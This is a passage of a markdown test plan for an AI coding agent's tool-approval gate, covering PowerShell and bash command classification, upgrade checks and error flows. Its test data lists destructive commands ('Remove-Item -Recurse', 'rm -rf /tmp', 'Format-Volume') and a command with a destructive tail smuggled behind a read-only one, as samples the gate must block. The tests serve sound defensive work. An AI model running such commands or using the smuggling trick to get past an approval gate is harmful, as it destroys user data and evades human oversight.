| 8 | Undecodable/opaque payload (base64 that does not decode to valid UTF-8 command) | Pend — `normalizePsCommand(...).decoded === false` → fail-secure (TDD §3.2 Step 1) |

**Test Data:** `testdata/bypass-vectors-testdata.csv` (column `vector`, `decoded_expected`)
**Postconditions:** 0 auto-approvals across all vectors
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-112: SEC-04 — Ordering invariant: Remove-Item never returns {approved:true} via read-only path

| Field | Value |
|-------|-------|
| **ID** | TC-112 (UT-37) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow — Security — Invariant |
| **Level** | UT — vitest |
| **Requirement** | SEC-04 (Medium); NFR-SEC-03 (TDD §8.4); §3.2 (branch returns explicitly, never falls through) |
| **Preconditions** | Gate handler wired per TDD v1.2 |

> **SEC-04 invariant:** the powershell branch must return explicitly and MUST NOT fall through to a generic read-only / Autopilot auto-approve. A destructive PS command must never reach `{approved:true}` by any path, independent of step ordering.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'powershell', input: { command: 'Remove-Item -Recurse .' } })` in BOTH modes | `res.approved === false` in both — never `{approved:true}` |
| 2 | Construct a command that superficially starts like an allowlisted cmdlet but contains a destructive tail: `Get-Content a.txt; Remove-Item -Recurse .` | Pends — compound statement rejected (not every segment safe); `READONLY_PS_PATTERNS` anchored + compound-rejection (§7.3.3) prevents smuggling |
| 3 | Assert invariant structurally | `requiresApproval`/read-only path can NEVER yield `{approved:true}` for any command matching `DESTRUCTIVE_PS_PATTERNS` — regression guard against future step reordering (SEC-04) |

**Test Data:** commands = `Remove-Item -Recurse .`, `Get-Content a.txt; Remove-Item -Recurse .`
**Postconditions:** Invariant holds; test is independent of internal step order
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-113: SEC-08 — Malformed / renamed input field (missing `command`) → pends (fail-secure)

| Field | Value |
|-------|-------|
| **ID** | TC-113 (UT-38) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow — Security |
| **Level** | UT — vitest |
| **Requirement** | SEC-08 (Medium); TDD v1.2 §7.4 (zod validation, fail-secure on missing `command`) |
| **Preconditions** | Gate handler wired per v1.2; approval-request `input` zod-validated (`z.object({ command: z.string() }).safeParse`) |

> **SEC-08:** if SDK 0.99.1 renames the shell tool's input field (`script`/`cmd`/`args[]`) or omits `command`, the gate MUST NOT treat it as empty-safe. For a shell tool, an absent/invalid `command` → fail-secure PEND, never auto-approve.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'powershell', input: { script: 'Get-ChildItem .' } })` (renamed field, no `command`) | `res.approved === false` — zod `safeParse` fails → fail-secure pend; NOT treated as empty-safe/auto-approve |
| 2 | Call with `input: { command: 123 }` (wrong type) | Pends — `z.string()` parse fails → pend |
| 3 | Call with `input: { args: ['Remove-Item'] }` (array shape) | Pends — no valid `command` string → pend |
| 4 | Verify audit flag | Decision logged with `matchedPattern = NO_SAFE_MATCH_PENDED` (SEC-05) and parse-failure reason |

**Test Data:** malformed inputs = `{script:'...'}`, `{command:123}`, `{args:['Remove-Item']}`
**Postconditions:** No empty-safe auto-approval on malformed input
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-114: SEC-09 — Unwired getMode() defaults to Supervised (regression)

| Field | Value |
|-------|-------|
| **ID** | TC-114 (UT-39) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow — Security — Regression |
| **Level** | UT — vitest |
| **Requirement** | SEC-09 (Low, confirmed); TDD v1.2 §1.4, §3.2 Step 5 (`opts?.getMode?.() ?? 'supervised'`) |
| **Preconditions** | Gate handler wired WITHOUT `getMode` (undefined `opts.getMode`) |

> **SEC-09 regression:** keep an explicit test that an unwired/undefined `getMode` never yields auto-approve for a non-read-only tool. Confirmed fail-secure in actual code.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Create handler with `opts = {}` (no `getMode`); call `requestApproval({ toolName: 'write', input: {} })` | `res.approved === false` — defaults to Supervised → pend (gate reached) |
| 2 | Call `requestApproval({ toolName: 'some-mcp-tool', input: {} })` with no `getMode` | Pends — unwired mode → Supervised; non-read-only unknown tool never auto-approves without an explicit Autopilot mode |
| 3 | Assert default | `opts?.getMode?.() ?? 'supervised'` evaluates to `'supervised'` — no auto-approve path reachable with mode unwired |

**Test Data:** toolNames = `write`, `some-mcp-tool`; `getMode` = undefined
**Postconditions:** Fail-secure default preserved
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-115: SEC-10 — Fallback-to-bash degrades the command-content gate (logged)

| Field | Value |
|-------|-------|
| **ID** | TC-115 (UT-40) |
| **Priority** | Medium |
| **Type** | Functional — Alternative Flow — Security |
| **Level** | UT — vitest |
| **Requirement** | SEC-10 (Low); TDD v1.2 §9.1 `powershell_fallback` WARN with `securityPosture: "command-content-gate-disabled"` |
| **Preconditions** | SDK mocked so `createPowerShellTool` throws → fallback to bash; log capture enabled |

> **SEC-10:** the PowerShell→bash fallback swaps a command-content-gated tool for a non-gated one. The posture change MUST be greppable in logs. (Behavior preserved per BRD §1.2 — this TC asserts the audit requirement, not a gate change for bash.)

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Trigger `createWorkspaceTools` on win32 with throwing PS factory → fallback to bash | Shell tool is `bash`; no crash |
| 2 | Inspect WARN log | `{ event: "powershell_fallback", reason, platform: "win32", securityPosture: "command-content-gate-disabled" }` present and greppable |
| 3 | Verify downstream gate for bash under fallback | bash follows pre-upgrade mode-dependent behavior (Supervised → pend; Autopilot → auto-approve) — content gate is powershell-only (documented degradation, BRD §1.2) |

**Test Data:** mocked throwing PS factory; platform = `win32`
**Postconditions:** Degraded posture logged for incident response
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

## 3. Functional Test Cases — Exception/Error Flows

### TC-200: npm install fails → lockfile/registry handling (EF-1 UC-001)

| Field | Value |
|-------|-------|
| **ID** | TC-200 (E2E-API-05) |
| **Priority** | High |
| **Type** | Functional — Exception Flow |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | UC-001 EF-1; FSD §3.1.2 EF-1, §6.1 step 3; Error: "Dependency installation failed" |
| **Preconditions** | Reproduced failure state (e.g., registry unreachable or broken lockfile) — simulated via invalid fixture on a scratch copy |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npm install` against a fixture with a broken lockfile (scratch copy, NOT the real repo) | Install fails with registry/lockfile error |
| 2 | Verify recovery procedure | Delete `node_modules` + `package-lock.json`, retry once — documented handling per FSD §6.1 |
| 3 | Verify real repo unaffected | Real repo still installs cleanly (`npm install` exit 0 — recovery was fixture-only) |

**Test Data:** fixture = scratch copy with corrupted `package-lock.json`
**Postconditions:** Real repo state unchanged; build aborts on genuine failure with retry suggestion
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-201: TSC breaking API change → errors reported, build blocked (EF-2 UC-001)

| Field | Value |
|-------|-------|
| **ID** | TC-201 (E2E-API-06) |
| **Priority** | High |
| **Type** | Functional — Exception Flow |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | UC-001 EF-2, Error Code PI_TSC_ERROR; FSD §3.1.2 EF-2, §9.1 |
| **Preconditions** | Fixture with a call site using a removed 0.99.1 API (scratch copy) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npx tsc --noEmit -p fixture/tsconfig.json` on fixture with breaking API call | tsc fails with type errors listed (`PI_TSC_ERROR`) |
| 2 | Verify build blocking behavior | Errors reported; deploy/build blocked until fixed per upgrade guide §2 |
| 3 | Verify escalation | If API removed entirely → escalate to SA for design change (documented path) |
| 4 | Verify real repo clean | Real repo `tsc --noEmit` exit 0 |

**Test Data:** fixture with removed API signature
**Postconditions:** Real repo unaffected
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-202: Version mismatch after dedupe → audit both package.json (EF-3 UC-001)

| Field | Value |
|-------|-------|
| **ID** | TC-202 (E2E-API-07) |
| **Priority** | High |
| **Type** | Functional — Exception Flow |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | UC-001 EF-3, BR-01, Error Code PI_DUPLICATE_DEP; FSD §3.1.2 EF-3 |
| **Preconditions** | Fixture where root and extension `package.json` declare different `@earendil-works/*` versions |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Scan fixture `package.json` files (root + extension) for `@earendil-works/*` declarations | Mismatch detected — versions not in lockstep |
| 2 | Verify audit logic reports single source of truth requirement | Error `PI_DUPLICATE_DEP` / mismatch flagged with file names |
| 3 | Verify real repo in lockstep | All 7 `@earendil-works/*` packages at `0.99.1` in both root and extension `package.json` |

**Test Data:** fixture mismatch = root `0.80.10` vs extension `0.99.1`
**Postconditions:** Real repo verified in lockstep
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-203: createPowerShellTool throws → catch, log, fallback bash, no crash (EF-1 UC-002)

| Field | Value |
|-------|-------|
| **ID** | TC-203 (UT-14) |
| **Priority** | High |
| **Type** | Functional — Exception Flow |
| **Level** | UT — vitest |
| **Requirement** | UC-002 EF-1, Error Code PI_PWSH_UNAVAILABLE; FSD §3.2.2 EF-1, §3.2.5; TDD §13.1 |
| **Preconditions** | SDK mocked so `createPowerShellTool` throws; `mockPlatform('win32')` |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` on win32 with throwing factory | Error caught by `createPowerShellToolSafe` — no unhandled rejection |
| 2 | Check fallback | `createBashTool(workspaceRoot)` returned as shell tool |
| 3 | Check Pino log | `{ event: "powershell_fallback", reason, platform: "win32" }` — WARN level (FSD §9.2) |
| 4 | Verify agent continues | `createWorkspaceTools` still returns core tools (read/write/edit/bash/grep/find/ls) |

**Test Data:** mocked throwing factory; platform = `win32`
**Postconditions:** Tool available as bash; system stable
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-204: PowerShell command exit code ≠ 0 → error result to agent loop (EF-2 UC-002)

| Field | Value |
|-------|-------|
| **ID** | TC-204 (IT-03) |
| **Priority** | High |
| **Type** | Functional — Exception Flow |
| **Level** | IT — vitest + real pwsh |
| **Requirement** | UC-002 EF-2; FSD §3.2.2 EF-2, §9.1 |
| **Preconditions** | Real PowerShell tool created; workspace root exists |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Execute failing command `Get-Content 'C:\projects\kiro\SDLC-Agents-4-Enterprise\definitely-missing-file-xyz.txt'` via the tool | Command fails (exit code ≠ 0) |
| 2 | Check result shape | Error result returned to agent loop (not thrown/crash) — agent decides retry or steer |
| 3 | Verify error content | Error output contains PowerShell-native error (e.g., `Cannot find path`) |

**Test Data:** command = `Get-Content 'C:\projects\kiro\SDLC-Agents-4-Enterprise\definitely-missing-file-xyz.txt'`
**Postconditions:** Agent loop intact; no crash
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts` (integration section)

---

### TC-205: Invalid drive letter → PowerShell-native error, no translation (EF-3 UC-002)

| Field | Value |
|-------|-------|
| **ID** | TC-205 (IT-04) |
| **Priority** | Medium |
| **Type** | Functional — Exception Flow |
| **Level** | IT — vitest + real pwsh |
| **Requirement** | UC-002 EF-3; FSD §3.2.2 EF-3 |
| **Preconditions** | Real PowerShell tool created on win32 |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Execute command `Get-ChildItem 'q:\nonexistent\path'` (invalid drive `q:`) | PowerShell-native error returned |
| 2 | Verify no translation | No Git-Bash translation attempted (no `/q/` mangling, no spawnHook artifacts) |
| 3 | Verify surfacing | Error surfaced to user/agent; not swallowed |

**Test Data:** command = `Get-ChildItem 'q:\nonexistent\path'`
**Postconditions:** Agent loop intact
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts` (integration section)

---

### TC-206: ToolApprovalGate throws → default require-approval (EF-1 UC-003)

| Field | Value |
|-------|-------|
| **ID** | TC-206 (UT-15) |
| **Priority** | High |
| **Type** | Functional — Exception Flow — Security |
| **Level** | UT — vitest |
| **Requirement** | UC-003 EF-1; FSD §3.3.2 EF-1, §6.3 step 1; TDD v1.1 §1.4 fail-secure principle |
| **Preconditions** | Gate handler wired with a gate mocked to throw; default Supervised mode (`getMode()` unwired) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'write', input: {} })` with throwing gate (default Supervised) — `write` NOT in `READ_ONLY_TOOLS`, so the gate IS reached | Error caught — no crash |
| 2 | Verify fail-secure default | Decision defaults to `require-approval` — failed-gate state NEVER auto-approves under Supervised (fail-secure, TDD v1.1 §1.4) |
| 3 | Verify surfacing | Error logged; surfaced to user |

**Test Data:** throwing gate mock; toolName = `write` (NOT `read` — `read` ∈ `READ_ONLY_TOOLS` auto-approves at Step 2 and never reaches the gate)
**Postconditions:** No security bypass; system stable
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-207: classifyToolCall receives unknown tool name → "shell" + log warn (EF-2 UC-003)

| Field | Value |
|-------|-------|
| **ID** | TC-207 (UT-16) |
| **Priority** | Medium |
| **Type** | Functional — Exception Flow |
| **Level** | UT — vitest |
| **Requirement** | UC-003 EF-2; FSD §3.3.2 EF-2, §9.2; TDD v1.1 §1.4 (mode-scoped unknown-safe) |
| **Preconditions** | Gate/classifier importable; default Supervised mode (`getMode()` unwired) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `classifyToolCall('mystery-tool-42', {})` (idealized FSD view) | No crash; default decision returned |
| 2 | Verify default under default Supervised mode | `require-approval` — pend via gate (unwired `getMode()` → Supervised, fail-secure default per TDD v1.1 §1.4); under Autopilot the same unknown tool auto-approves (unknown-safe classifier — deliberate MCP design, TDD §7.2) |
| 3 | Check log | WARN logged: `{ event: "classify_tool_unknown", toolName: "mystery-tool-42" }` (FSD §9.2) |

**Test Data:** toolName = `mystery-tool-42`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

## 4. Business Rule Validation

### TC-300: BR-01 — All @earendil-works/* packages at the same version (0.99.1)

| Field | Value |
|-------|-------|
| **ID** | TC-300 (UT-17) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | UT — vitest |
| **Requirement** | BR-01 from FSD §3.1.3; BRD Story 1 |
| **Preconditions** | Real `package.json` files (root + extension) on upgrade branch |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Read `@earendil-works/*` versions from `extension/package.json` | All 7 packages (`pi-coding-agent`, `pi-agent-core`, `pi-ai`, `pi-tui`, `chord`, `pi-mcp`, `pi-codemode`) = `0.99.1` |
| 2 | Compare root vs extension declarations | Identical versions in lockstep |
| 3 | Assert lockstep property | Every `@earendil-works/*` declaration equals `0.99.1` |

**Test Data:** packages = `@earendil-works/pi-coding-agent, pi-agent-core, pi-ai, pi-tui, chord, pi-mcp, pi-codemode`; expected = `0.99.1`
**Postconditions:** None
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-301: BR-02 — No `as any` shortcuts in type fixes (Property-Based)

| Field | Value |
|-------|-------|
| **ID** | TC-301 (PBT-01) |
| **Priority** | High |
| **Type** | Business Rule — Property-Based |
| **Level** | PBT — fast-check + vitest |
| **Requirement** | BR-02 from FSD §3.1.3; BRD Story 1; TDD §1.4 "No `as any`" |
| **Preconditions** | All changed source files available on disk |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Property: for ANY file in changed set (`extension/src/pi-workflow/**`, `extension/src/chat/engine/**`), scan content for ` as any` | Property holds: zero occurrences across ALL files |
| 2 | Verify against git diff of upgrade branch | No `as any` introduced by the upgrade |

**Test Data:** file globs = `extension/src/pi-workflow/**/*.ts`, `extension/src/chat/engine/**/*.ts`; pattern = `as any`
**Postconditions:** None
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts` (property section)

---

### TC-302: BR-03 — Version semver compatible with Node 22.x engine

| Field | Value |
|-------|-------|
| **ID** | TC-302 (E2E-API-08) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | BR-03 from FSD §3.1.3; FSD §8 Compatibility; TDD §15.2 Q1 |
| **Preconditions** | Node installed; 0.99.1 package metadata available |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Read `engines.node` from root and 0.99.1 `package.json` | `22.x` (root) satisfies 0.99.1 requirement |
| 2 | Run `node --version` | Output `v22.x` — compatible with engines constraint |
| 3 | Assert semver compatibility | No engine conflict — no Node bump required |

**Test Data:** expected Node = `v22.x`; engines.node = `22.x`
**Postconditions:** None
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-303: BR-04 — Single resolved pi-agent-core instance (no duplicates)

| Field | Value |
|-------|-------|
| **ID** | TC-303 (UT-18) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | UT — vitest (exec-backed fixture check) |
| **Requirement** | BR-04 from FSD §3.1.3; BRD Story 1 AC-3 |
| **Preconditions** | `npm ls` output captured after install (see TC-009) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Parse `npm ls @earendil-works/pi-agent-core` output | `duplicateCount === 0` |
| 2 | Assert exactly one resolved version | One instance of `0.99.1` in tree |

**Test Data:** packageName = `@earendil-works/pi-agent-core`; expected duplicateCount = `0`
**Postconditions:** None
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-304: BR-05 — On win32, shell tool name must be "powershell"

| Field | Value |
|-------|-------|
| **ID** | TC-304 (UT-19) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | UT — vitest |
| **Requirement** | BR-05 from FSD §3.2.3; BRD Story 2 AC-1 |
| **Preconditions** | `mockPlatform('win32')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` on win32 | Returns tool array |
| 2 | Assert tool name invariant | Shell tool `tool.name === 'powershell'` (strict equality — not label/description) |

**Test Data:** platform = `win32`; expected name = `powershell`
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-305: BR-06 — On non-win32, shell tool name must be "bash"

| Field | Value |
|-------|-------|
| **ID** | TC-305 (UT-20) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | UT — vitest |
| **Requirement** | BR-06 from FSD §3.2.3; BRD Story 2 AC-2 |
| **Preconditions** | `mockPlatform('linux')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` on linux | Returns tool array |
| 2 | Assert tool name invariant | Shell tool `tool.name === 'bash'` |
| 3 | Assert session loadout invariant (FSD §10.1 TC-10) | `getSessionToolLoadout` on linux excludes `powershell`, includes `bash` |

**Test Data:** platform = `linux`; expected name = `bash`
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts` + `pi-agent-session-host.test.ts`

---

### TC-306: BR-07 — No shellPath option passed to createPowerShellTool

| Field | Value |
|-------|-------|
| **ID** | TC-306 (UT-21) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | UT — vitest |
| **Requirement** | BR-07 from FSD §3.2.3; TDD §1.5 constraint |
| **Preconditions** | SDK mocked with spy on `createPowerShellTool` |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` on win32 with spied factory | Factory invoked |
| 2 | Inspect call args | First arg = `workspaceRoot` (string, absolute) |
| 3 | Assert no shellPath | Call args contain NO `shellPath` option — 0.99.1 self-resolves pwsh.exe |

**Test Data:** spy on `m.createPowerShellTool`; platform = `win32`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-307: BR-08 — PowerShell tool uses powershellToolSystemPromptContribution

| Field | Value |
|-------|-------|
| **ID** | TC-307 (IT-05) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | IT — vitest + real SDK |
| **Requirement** | BR-08 from FSD §3.2.3; Upgrade Guide §3a; FSD §3.4 |
| **Preconditions** | Real 0.99.1 SDK installed; win32 |

**Test Steps:**

| Step | Action | Expected Result |
|-------|--------|-----------------|
| 1 | Build system prompt via real `buildWorkspaceSystemPrompt` on win32 | PowerShell dialect contribution active |
| 2 | Verify PowerShell tool description (real tool) | Tool description reflects PowerShell dialect (not bash `BASH_DIALECT_NOTE`) |
| 3 | Verify prompt + tool consistent | Both prompt and tool guide toward PowerShell cmdlets (`Get-ChildItem/Get-Content/Test-Path`) |

**Test Data:** workspaceRoot = `C:\projects\kiro\SDLC-Agents-4-Enterprise`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts` (integration section)

---

### TC-308: BR-09 — Git-Bash workaround retired for Windows

| Field | Value |
|-------|-------|
| **ID** | TC-308 (E2E-API-09) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | E2E-API — vitest + exec (static scan) |
| **Requirement** | BR-09 from FSD §3.2.3; BRD Story 2; FSD §10.1 TC-15 |
| **Preconditions** | Upgrade branch source available |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Scan `extension/src/pi-workflow/pi-coding-tools.ts` for `resolveGitBashPath` and `normalizeBashCommandPaths` invocations on the win32 code path | No calls on win32 path (function retired or not invoked) |
| 2 | Scan bundled output (dist/bundle) for Git-Bash pin logic | No `shellPath` pin wired for Windows |
| 3 | Verify `resolve-git-bash.test.ts` deleted (TDD §12 step 34) | File `extension/src/pi-workflow/__tests__/resolve-git-bash.test.ts` no longer exists |

**Test Data:** file = `extension/src/pi-workflow/pi-coding-tools.ts`; deleted file = `__tests__/resolve-git-bash.test.ts`
**Postconditions:** None
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-309: BR-10 — Read-only powershell auto-approves via allowlist in both modes (bash divergent — mode-scoped)

| Field | Value |
|-------|-------|
| **ID** | TC-309 (UT-22) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | UT — vitest |
| **Requirement** | BR-10 from FSD §3.3.3; BRD Story 3, Story 4; TDD v1.2 §3.2 Step 1b/§7.2 (allowlist-of-safe; bash unchanged per BRD §1.2) |
| **Preconditions** | `pi-workflow-gate.ts` importable per v1.2; `READONLY_PS_PATTERNS` exported; `getMode()` wired for mode switching (default = Supervised when unwired) |

> **v1.2 re-scope (SEC-02):** `powershell` is NO LONGER in `READ_ONLY_TOOLS`. A read-only PS command auto-approves via a positive `READONLY_PS_PATTERNS` match (§3.2 Step 1b), not name-set membership. `bash` is divergent (NOT content-gated, NOT allowlisted).

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'powershell', input: { command: 'Get-ChildItem .' } })` with `getMode()` → `'supervised'`, then again with `'autopilot'` | `res.approved === true` in **BOTH modes** — auto-approve via `READONLY_PS_PATTERNS` positive match (§3.2 Step 1b, BR-10), NOT via `READ_ONLY_TOOLS` membership |
| 2 | Call `handler.requestApproval({ toolName: 'bash', input: { command: 'Get-ChildItem .' } })` under default Supervised (`getMode()` unwired) | `res.approved === false` — **pends via gate, NOT auto-approve**: `bash` is NOT content-gated/allowlisted (TDD v1.2 §3.2/§7.2; pre-upgrade behavior, BRD §1.2) — divergent from PS |
| 3 | Same bash call with `getMode()` → `'autopilot'` | `res.approved === true` — auto-approve (non-destructive classification, `requiresApproval('bash') === false`; TDD v1.2 §7.2) |

**Test Data:** commands = `Get-ChildItem .` for both `powershell` and `bash`; modes = `supervised`, `autopilot`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-310: BR-11 — Destructive PowerShell patterns gated (`DESTRUCTIVE_PS_PATTERNS`)

| Field | Value |
|-------|-------|
| **ID** | TC-310 (UT-23) |
| **Priority** | High |
| **Type** | Business Rule — Security |
| **Level** | UT — vitest |
| **Requirement** | BR-11 from FSD §3.3.3 ("DANGEROUS_TOOLS must include powershell for destructive commands" — implemented via `DESTRUCTIVE_PS_PATTERNS`, TDD v1.2 §7.3.2); FSD §3.3.4 (canonical source `ToolApprovalClassifier.ts`) |
| **Preconditions** | `ToolApprovalClassifier` importable with `DESTRUCTIVE_PS_PATTERNS` export (TDD v1.2 §7.3.2); name-based `DANGEROUS_TOOL_PATTERNS` unchanged (no `powershell` entry) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | For each destructive sample (`Remove-Item -Recurse C:\x`, `rm -rf /tmp`, `Clear-Content x`, `Format-Volume`, `Stop-Process -Name node`, `git push origin main`, `git commit -m x`), call `handler.requestApproval({ toolName: 'powershell', input: { command: <sample> } })` | All 7 → `res.approved === false` (require-approval) |
| 2 | Verify actual mechanism (TDD v1.2 §3.2 Step 1) | `createToolApprovalGateHandler` matches `DESTRUCTIVE_PS_PATTERNS` against the NORMALIZED `req.input.command` FIRST — **mode-independent** (pend in BOTH Supervised and Autopilot); `DANGEROUS_TOOL_PATTERNS` name set UNCHANGED — no `powershell` entry |
| 3 | Category breadth note | This TC asserts the 7 FSD §7.3 legacy samples; the FULL destructive category coverage (file-delete, overwrite, process/service, format/disk, policy/security, accounts, scheduled, git-destructive) is exercised by TC-110 (SEC-01 matrix) |

**Test Data:** samples = `Remove-Item -Recurse C:\x`, `rm -rf /tmp`, `Clear-Content x`, `Format-Volume`, `Stop-Process -Name node`, `git push origin main`, `git commit -m x`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-311: BR-12 — classifyTool returns valid category for arbitrary tool names (Property-Based)

| Field | Value |
|-------|-------|
| **ID** | TC-311 (PBT-02) |
| **Priority** | High |
| **Type** | Business Rule — Property-Based |
| **Level** | PBT — fast-check + vitest |
| **Requirement** | BR-12 from FSD §3.3.3; FSD §3.3.6 |
| **Preconditions** | `StreamProtocolAdapter` instantiated; fast-check available |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Property: for 200 random strings (fast-check `fc.string()`), call `adapter.classifyTool(name)` | Property holds: result is ALWAYS one of `'shell' | 'file' | 'mcp' | 'search' | 'browser'` — never throws, never undefined |
| 2 | Property: names containing `shell`/`terminal`/`powershell`/`bash` always classify `'shell'` | Holds for random composites (e.g., `my-powershell-ext`) |

**Test Data:** 200 random strings via `fc.string({ minLength: 0, maxLength: 40 })`
**Postconditions:** None
**File:** `extension/tests/e2e/classify-tool.pbt.test.ts`

---

### TC-312: BR-13 — buildFailureSteerCorrection shell-aware for arbitrary inputs (Property-Based)

| Field | Value |
|-------|-------|
| **ID** | TC-312 (PBT-03) |
| **Priority** | High |
| **Type** | Business Rule — Property-Based |
| **Level** | PBT — fast-check + vitest |
| **Requirement** | BR-13 from FSD §3.3.3; FSD §3.3.5; TDD §3.4 |
| **Preconditions** | `turn-budget-guard.ts` importable; fast-check available |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Property: for 200 random (toolName, repeatCount) pairs, call `buildFailureSteerCorrection(toolName, repeatCount)` | Property holds: output non-empty; contains `STOP retrying`; never throws |
| 2 | Property: for ANY toolName, output contains `PowerShell` if toolName === 'powershell'; contains `bash` if toolName === 'bash' | Shell-aware for all inputs |
| 3 | Property: repeatCount correctly embedded | Output contains `failed ${repeatCount} times` for all random counts ≥ 1 |

**Test Data:** 200 random toolNames (`fc.string()`) × repeatCounts (`fc.integer({ min: 1, max: 50 })`)
**Postconditions:** None
**File:** `extension/tests/e2e/steer-correction.pbt.test.ts`

---

### TC-313: BR-14 — Session tool loadout includes powershell on win32

| Field | Value |
|-------|-------|
| **ID** | TC-313 (UT-24) |
| **Priority** | High |
| **Type** | Business Rule |
| **Level** | UT — vitest |
| **Requirement** | BR-14 from FSD §3.3.3; FSD §3.5.2; TDD §3.6 |
| **Preconditions** | `mockPlatform('win32')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `getSessionToolLoadout(workspaceRoot)` on win32 | Loadout includes `"powershell"` |
| 2 | Verify full allowlist | Contains `read`, `write`, `edit`, `powershell`, `grep`, `find`, `ls` (TDD §6.2 allowlist) |
| 3 | Verify no dual shell | Excludes `bash` |

**Test Data:** expected allowlist = `['read', 'write', 'edit', 'powershell', 'grep', 'find', 'ls']`
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-agent-session-host.test.ts`

---

### TC-314: BR-14 inverse — Session loadout excludes powershell on non-win32

| Field | Value |
|-------|-------|
| **ID** | TC-314 (UT-25) |
| **Priority** | Medium |
| **Type** | Business Rule |
| **Level** | UT — vitest |
| **Requirement** | BR-06 (session inverse); FSD §3.5.2; FSD §10.1 TC-10 |
| **Preconditions** | `mockPlatform('linux')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `getSessionToolLoadout(workspaceRoot)` on linux | Loadout excludes `"powershell"` |
| 2 | Verify bash present | Includes `"bash"` — single shell tool per platform |

**Test Data:** platform = `linux`; expected = bash present, powershell absent
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-agent-session-host.test.ts`

---

### TC-315: SEC-02 — READONLY_PS_PATTERNS is the sole authority for powershell auto-approval

| Field | Value |
|-------|-------|
